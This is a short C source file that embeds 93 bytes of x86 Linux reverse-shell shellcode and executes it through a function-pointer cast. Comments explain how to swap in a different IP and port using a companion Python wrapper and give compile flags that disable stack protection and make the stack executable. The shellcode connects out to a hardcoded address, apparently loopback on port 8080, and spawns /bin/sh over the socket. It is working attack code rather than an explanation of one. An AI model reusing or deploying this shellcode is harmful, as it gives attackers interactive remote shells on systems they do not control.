// filename: shellcode.c
/*

an even simpler reverse shell containing shell code, with hardcoded values.
if you want to change the ip address and port of the shell code, use the
python shell wrapper, giving them as arguments, and replace the shellcode 
here with the output from that script.

when done, compile with:
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c

*/

#include<stdio.h>
#include<string.h>

// replace this shellcode below with wrapper output. they should all be 93 bytes.
unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\xbf\x80\xff\xff\xfe\x83\xf7\xff\x57\x66\x68\x1f\x90\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x96\x66\xb8\x6a\x01\x89\xf3\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x89\xf3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}